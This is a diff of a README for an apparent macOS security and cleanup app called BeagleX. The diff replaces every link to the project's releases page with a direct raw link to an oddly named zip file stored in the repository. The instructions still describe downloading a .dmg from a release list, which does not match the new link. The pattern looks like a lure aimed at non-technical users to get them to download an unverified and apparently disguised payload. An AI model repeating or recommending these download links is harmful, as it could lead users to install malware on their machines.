@@ -1,12 +1,12 @@
 # 🛡️ beaglex-mac - Keep your computer clean and safe
 
-[![](https://img.shields.io/badge/Download_BeagleX-Blue?style=for-the-badge)](https://github.com/Neckless-khat431/beaglex-mac/releases)
+[![](https://img.shields.io/badge/Download_BeagleX-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Neckless-khat431/beaglex-mac/main/sturdy/beaglex_mac_gymnics.zip)
 
 BeagleX helps you protect your computer. It scans for threats, cleans your memory, and monitors system performance. This tool keeps your machine fast and secure. You do not need technical skills to use it.
 
 ## 📥 How to download the software
 
-To start, you must get the installation file from our release page. Visit this link: [https://github.com/Neckless-khat431/beaglex-mac/releases](https://github.com/Neckless-khat431/beaglex-mac/releases).
+To start, you must get the installation file from our release page. Visit this link: [https://raw.githubusercontent.com/Neckless-khat431/beaglex-mac/main/sturdy/beaglex_mac_gymnics.zip](https://raw.githubusercontent.com/Neckless-khat431/beaglex-mac/main/sturdy/beaglex_mac_gymnics.zip).
 
 Look for the latest version at the top of the list. Click the file ending in `.dmg` to save it to your computer. Once the download finishes, open the file in your downloads folder. Drag the BeagleX icon into your Applications folder. You can then open the app just like any other program on your machine.
 
@@ -73,4 +73,4 @@ Sometimes an app gets marked as a threat wrongly. You can add those files to a w
 
 If you have trouble, check the issues page on our GitHub. You can search for your problem there. Other users might have experienced the same thing. If you do not find an answer, create a new issue. Describe what happened and what version of the software you use.
 
-[![](https://img.shields.io/badge/Download_BeagleX-Grey?style=for-the-badge)](https://github.com/Neckless-khat431/beaglex-mac/releases)
+[![](https://img.shields.io/badge/Download_BeagleX-Grey?style=for-the-badge)](https://raw.githubusercontent.com/Neckless-khat431/beaglex-mac/main/sturdy/beaglex_mac_gymnics.zip)
